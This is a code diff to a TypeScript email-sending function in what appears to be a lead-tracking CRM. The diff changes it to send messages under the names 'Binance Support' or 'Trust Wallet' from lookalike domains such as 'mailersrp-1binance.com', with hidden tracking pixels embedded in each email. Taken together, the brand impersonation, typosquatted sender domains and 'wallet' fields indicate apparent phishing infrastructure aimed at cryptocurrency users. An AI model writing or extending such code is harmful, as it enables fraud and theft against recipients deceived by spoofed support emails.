@@ -36,8 +36,7 @@ interface EmailRequest {
   domain?: string;
   wallet?: string;
   step?: number;
-  send_method?: string; // 'php' | 'resend' | 'alias'
-  alias_from?: string;
+  send_method?: string; // 'php' | 'resend'
   // New format from CRM
   leadId?: string;
   templateId?: string;
@@ -51,7 +50,7 @@ const handler = async (req: Request): Promise<Response> => {
 
   try {
     const requestBody = await req.json();
-    let { to, name, first_name, user_id, contact_id, template_id, subject, content, commercial_id, domain, wallet, step, leadId, templateId, commercialId, send_method, alias_from } = requestBody;
+    let { to, name, first_name, user_id, contact_id, template_id, subject, content, commercial_id, domain, wallet, step, leadId, templateId, commercialId, send_method } = requestBody;
     
     // Initialize Supabase client
     const supabase = createClient(
@@ -156,9 +155,9 @@ const handler = async (req: Request): Promise<Response> => {
         { status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
       );
     }
-    // Choose Resend domain and API key (Resend-only sending with default domains)
+    // Choose Resend domain and API key based on commercial settings
     let resendApiKey = '';
-    let fromDomain = 'Trust Wallet <onboarding@resend.dev>';
+    let fromDomain = '';
     let sendMethod = 'resend';
 
     // Get commercial's email preferences
@@ -172,13 +171,21 @@ const handler = async (req: Request): Promise<Response> => {
     const emailPreference = (commercialData?.email_domain_preference || domain || 'domain1')?.toLowerCase();
     console.log('🎯 Email preference determined:', emailPreference);
 
+    // Determine sender name based on template content (check subject and content first)
+    const templateContent = (subject || content || '').toLowerCase();
+    const isBinanceTemplate = templateContent.includes('binance');
+    const emailSenderName = isBinanceTemplate ? 'Binance Support' : 'Trust Wallet';
+
+    // Set domain and API key based on preference
     if (emailPreference === 'domain2') {
-      fromDomain = 'Binance Support <hello@resend.dev>';
+      fromDomain = `${emailSenderName} <do_not_reply@mailersrp-2binance.com>`;
       resendApiKey = Deno.env.get('RESEND_API_KEY_DOMAIN2') ?? Deno.env.get('RESEND_API_KEY') ?? '';
     } else {
-      fromDomain = 'Trust Wallet <onboarding@resend.dev>';
+      fromDomain = `${emailSenderName} <do_not_reply@mailersrp-1binance.com>`;
       resendApiKey = Deno.env.get('RESEND_API_KEY') ?? '';
     }
+
+    console.log('Sender name:', emailSenderName);
 
     if (!resendApiKey) {
       console.error('Missing Resend API key for selected domain');
@@ -470,14 +477,12 @@ const handler = async (req: Request): Promise<Response> => {
     // Add tracking pixel to email content
     emailContent += `<img src="${openTrackingUrl}" width="1" height="1" style="display:none;" />`;
 
-    // Determine sender name based on template type
-    const senderName = isTrustWalletTemplate ? "TRUST WALLET" : 
-                      isLedgerTemplate ? "LEDGER" : "BINANCE";
+    // Note: Sender name is now determined earlier in the code based on domain preference
 
     // Log email sending attempt
     console.log("Sending email to:", to, "with tracking code:", trackingCode);
     console.log("Server IP used:", currentServerIp);
-    console.log("Sender name:", senderName);
+    console.log("Sender name:", emailSenderName);
     console.log("Send method:", sendMethod);
 
     let emailResponse;
@@ -491,7 +496,7 @@ const handler = async (req: Request): Promise<Response> => {
           subject: emailSubject,
           message: emailContent,
           from_email: fromDomain,
-          from_name: senderName,
+          from_name: emailSenderName,
           tracking_code: trackingCode,
           envelope_from: fromDomain
         };
@@ -527,7 +532,7 @@ const handler = async (req: Request): Promise<Response> => {
           throw new Error(`Alias email sending failed and Resend init failed: ${(phpError as any)?.message}`);
         }
         emailResponse = await resendClient.emails.send({
-          from: `${senderName} <${fromDomain}>`,
+          from: fromDomain,
           to: [to],
           subject: emailSubject,
           html: emailContent,
@@ -543,7 +548,7 @@ const handler = async (req: Request): Promise<Response> => {
       }
       
         emailResponse = await resendClient.emails.send({
-          from: `${senderName} <${fromDomain}>`,
+          from: fromDomain,
           to: [to],
         subject: emailSubject,
         html: emailContent,
